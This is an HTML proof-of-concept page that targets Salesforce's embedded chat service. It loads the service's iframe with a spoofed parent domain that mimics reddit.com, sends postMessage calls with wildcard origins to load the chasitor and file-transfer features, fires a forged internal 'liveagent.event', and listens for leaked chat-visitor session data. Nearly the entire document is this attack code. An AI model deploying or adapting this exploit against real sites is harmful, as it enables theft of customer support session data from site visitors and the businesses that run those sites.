<!DOCTYPE html>
<html>
<head>
  <title>Salesforce Chasitor PoC</title>
  <meta charset="UTF-8">
  <script>
    let once = false;

    window.addEventListener("message", function (e) {
      const data = e.data;
      if (typeof data !== "object" || !data.method) return;

      console.log("ðŸ“© Message from iframe:", data);

      // Only log once
      if (!once && data.method === "liveagent.event") {
        once = true;
        console.log("ðŸ“¦ Chasitor Data Leaked:", data.data?.chasitorData || "(none)");
      }
    });

    function runPoC() {
      const frame = document.getElementById("eswFrame");

      // 1. Load features
      frame.contentWindow.postMessage({ method: "script.load", feature: "chasitor" }, "*");
      frame.contentWindow.postMessage({ method: "script.load", feature: "filetransfer" }, "*");

      // 2. Send fake internal event to trigger info reflection
      setTimeout(() => {
        console.log("ðŸ“¤ Sending fake event to trigger session info leak");

        frame.contentWindow.postMessage({
          method: 'liveagent.event',
          data: {
            event: 'chasitorDataDump',
            params: {
              key: 'POC',
              value: 'Test leak attempt'
            }
          }
        }, '*');
      }, 2000); // allow 2 sec for scripts to load
    }
  </script>
</head>
<body onload="runPoC()">
  <h2>Salesforce Chasitor Session Leak PoC</h2>
  <iframe
    id="eswFrame"
    src="https://service.force.com/embeddedservice/4.0/esw.html?parent=https://reddit.com.wangdubruh.xyz"
    width="500"
    height="400"
    style="border:1px solid black"
    allow="camera *; microphone *;"
  ></iframe>
</body>
</html>
